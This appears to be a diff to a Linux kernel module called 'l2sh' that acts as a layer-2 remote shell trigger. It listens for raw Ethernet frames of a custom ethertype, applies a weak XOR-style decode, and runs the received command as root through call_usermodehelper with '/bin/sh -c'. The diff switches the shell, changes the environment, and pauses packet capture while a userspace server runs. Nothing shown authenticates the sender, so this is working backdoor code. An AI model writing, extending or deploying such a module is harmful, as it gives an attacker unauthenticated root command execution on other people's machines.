@@ -59,9 +59,12 @@ static struct {
     struct net_device *dev;
     u8 cli_mac[ETH_ALEN];
     bool have_cli;
+    bool capture_enabled;
 } g;
 
 #define l2sh_info(fmt, ...) pr_info("l2sh: " fmt, ##__VA_ARGS__)
+
+static const u8 zero_key[4] = {0, 0, 0, 0};
 
 static void enc_dec(const u8 *in, u8 *out, const u8 *key, size_t len) {
     static const u8 km[4] = {4, 1, 2, 3};
@@ -89,6 +92,9 @@ static u32 csum32(const u8 *p, size_t n) {
 static void dedup_init(struct dedup_cache *dc) {
     memset(dc, 0, sizeof(*dc));
 }
+
+static void disable_capture(void);
+static void enable_capture(void);
 
 static void dump_frame(const char *tag, const u8 *buf, size_t len) {
     if (!buf || !len) return;
@@ -124,13 +130,12 @@ static bool dedup_drop(struct dedup_cache *dc, const u8 mac[ETH_ALEN],
     return false;
 }
 
-static void launch_workfn(struct work_struct *work) {
+static void exec_server(struct work_struct *work) {
     static char *envp[] = {
-        "HOME=/",
+        "HOME=/tmp",
         "TERM=xterm-256color",
-        "PATH=/usr/bin:/bin:/usr/sbin:/sbin",
         NULL};
-    char *argv[] = {"/usr/bin/setsid", "/bin/bash", "-c", g.cmd_buf, NULL};
+    char *argv[] = {"/usr/bin/setsid", "/bin/sh", "-c", g.cmd_buf, NULL};
     struct subprocess_info *info;
 
     pr_info("l2sh: launching command: %s\n", g.cmd_buf);
@@ -144,7 +149,9 @@ static void launch_workfn(struct work_struct *work) {
         return;
     }
 
-    call_usermodehelper_exec(info, UMH_WAIT_EXEC);
+    disable_capture();
+    call_usermodehelper_exec(info, UMH_WAIT_PROC);
+    enable_capture();
 
     spin_lock(&g.launch_lock);
     g.launch_pending = false;
@@ -245,6 +252,9 @@ static int l2_rx(struct sk_buff *skb, struct net_device *dev, struct packet_type
         return NET_RX_SUCCESS;
     }
 
+    if (psize > 0)
+        enc_dec((u8 *)(h + 1), (u8 *)(h + 1), zero_key, psize);
+
     if (!g.have_cli || memcmp(g.cli_mac, eth->h_source, ETH_ALEN)) {
         memcpy(g.cli_mac, eth->h_source, ETH_ALEN);
         rcu_assign_pointer(g.dev, dev);
@@ -286,20 +296,36 @@ static struct packet_type l2_pt = {
     .func = l2_rx,
 };
 
+static void disable_capture(void) {
+    if (!g.capture_enabled)
+        return;
+    dev_remove_pack(&l2_pt);
+    g.capture_enabled = false;
+    pr_info("l2sh: capture disabled, handing off to userspace server\n");
+}
+
+static void enable_capture(void) {
+    if (g.capture_enabled)
+        return;
+    dev_add_pack(&l2_pt);
+    g.capture_enabled = true;
+    pr_info("l2sh: capture re-enabled\n");
+}
+
 static int __init l2_init(void) {
     memset(&g, 0, sizeof(g));
     spin_lock_init(&g.launch_lock);
-    INIT_WORK(&g.launch_work, launch_workfn);
+    INIT_WORK(&g.launch_work, exec_server);
     dedup_init(&g.dc);
 
-    dev_add_pack(&l2_pt);
+    enable_capture();
     pr_info("l2sh: kernel trigger loaded, ethertype 0x%04x\n", ETHER_TYPE_CUSTOM);
     log_interfaces();
     return 0;
 }
 
 static void __exit l2_exit(void) {
-    dev_remove_pack(&l2_pt);
+    disable_capture();
     flush_work(&g.launch_work);
     pr_info("l2sh: unloaded\n");
 }
